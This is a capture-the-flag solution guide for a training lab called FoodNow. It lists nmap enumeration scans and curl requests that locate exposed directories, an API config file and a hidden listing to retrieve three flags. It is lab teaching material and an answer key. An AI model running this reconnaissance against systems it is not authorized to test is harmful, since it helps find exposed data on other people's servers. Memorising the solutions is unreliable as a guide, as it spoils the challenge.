# FoodNow CTF Challenge - Flag Discovery Guide

**⚠️ FOR AUTHORIZED LAB USE ONLY**  
This document contains solutions for the FoodNow training challenges. Use only in isolated lab environments.

**📝 NOTE:** Flags are randomized hexadecimal values that change every time the server starts. The format is `THM{<CHALLENGE_NAME>_<random_hex>}`.

---

## Flag Discovery Methods

### Easy Flag - Service Enumeration & Directory Listing

**Steps:**
1. **Port Scan:**
   ```bash
   nmap -Pn -p 8080 <local_machine_ip>
   ```

2. **HTTP Service Enumeration:**
   ```bash
   nmap -Pn -p 8080 --script http-enum <local_machine_ip>
   ```

3. **Directory Discovery:**
   ```bash
   nmap -Pn -p 8080 --script http-enum,http-ls <local_machine_ip>
   ```

4. **Retrieve Easy Flag:**
   ```bash
   curl http://<local_machine_ip>:8080/uploads/flag_easy.txt
   ```
   
   **Expected Output:** `THM{EASY_FLAG_DIRECTORY_ENUM_SUCCESS_<random_hex>}`

---

### Medium Flag - API Configuration Discovery

**Steps:**
1. **HTTP Header Analysis:**
   ```bash
   nmap -Pn -p 8080 --script http-headers <local_machine_ip>
   ```

2. **HTTP Methods Discovery:**
   ```bash
   nmap -Pn -p 8080 --script http-methods <local_machine_ip>
   ```

3. **API Endpoint Discovery:**
   ```bash
   nmap -Pn -p 8080 --script http-enum --script-args http-enum.basepath="/api/" <local_machine_ip>
   ```

4. **Access API Config:**
   ```bash
   curl http://<local_machine_ip>:8080/api/config.json
   ```
   
   **Expected Output:** JSON containing `"flag_medium": "THM{MEDIUM_FLAG_NONSTANDARD_PORT_DISCOVERED_<random_hex>}"`

---

### Hard Flag - Robots.txt Debug Command

**Steps:**
1. **Robots.txt Discovery:**
   ```bash
   nmap -Pn -p 8080 --script http-robots.txt <local_machine_ip>
   ```

2. **Advanced HTTP Enumeration:**
   ```bash
   nmap -Pn -p 8080 --script http-enum,http-git,http-backup-finder <local_machine_ip>
   ```

3. **Custom NSE Script for Debug Commands:**
   ```bash
   nmap -Pn -p 8080 --script http-grep --script-args "http-grep.match='debug|listing|cmd'" <local_machine_ip>
   ```

4. **Use Debug Command:**
   ```bash
   curl http://<local_machine_ip>:8080/uploads/.listing
   ```

5. **Access Hard Flag:**
   ```bash
   curl http://<local_machine_ip>:8080/uploads/flag_hard.txt
   ```
   
   **Expected Output:** `THM{HARD_FLAG_MULTISERVICE_ARCHITECTURE_ENUMERATED_<random_hex>}`
